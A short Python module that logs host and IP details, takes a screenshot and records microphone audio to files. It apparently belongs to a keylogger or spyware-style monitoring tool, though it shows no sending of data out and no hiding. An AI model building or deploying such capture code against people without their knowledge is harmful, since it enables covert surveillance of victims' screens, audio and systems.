import platform
import socket
import pyscreenshot
import sounddevice as sd
import wave
from logging_utils import append_log

def system_information():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()
    append_log(f"System Info: {hostname}, {ip}, {plat}, {system}, {machine}")

def screenshot():
    screenshot_path = "screenshot.png"
    img = pyscreenshot.grab()
    img.save(screenshot_path)
    print(f"Screenshot saved: {screenshot_path}")
    return screenshot_path

def microphone(record_time):
    fs = 44100  # Sampling frequency
    audio_path = "audio.wav"
    print("Recording audio...")
    recording = sd.rec(int(record_time * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until the recording is finished
    with wave.open(audio_path, "wb") as wave_file:
        wave_file.setnchannels(2)  # Stereo
        wave_file.setsampwidth(2)  # Sample width in bytes
        wave_file.setframerate(fs)
        wave_file.writeframes(recording.tobytes())
    print(f"Audio saved: {audio_path}")
    return audio_path
